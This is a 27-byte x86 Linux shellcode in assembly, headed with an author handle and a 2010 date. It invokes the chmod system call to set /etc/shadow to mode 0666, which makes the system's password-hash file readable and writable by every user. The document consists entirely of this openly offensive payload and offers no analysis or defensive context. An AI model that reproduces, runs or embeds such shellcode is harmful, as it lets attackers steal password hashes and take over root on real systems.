; linux/x86 chmod 666 /etc/shadow 27 bytes
; root@thegibson
; 2010-01-15

section .text
        global _start

_start:
        ; chmod("//etc/shadow", 0666);
        mov al, 15
        cdq
        push edx
        push dword 0x776f6461
        push dword 0x68732f63
        push dword 0x74652f2f
        mov ebx, esp
        mov cx, 0666o
        int 0x80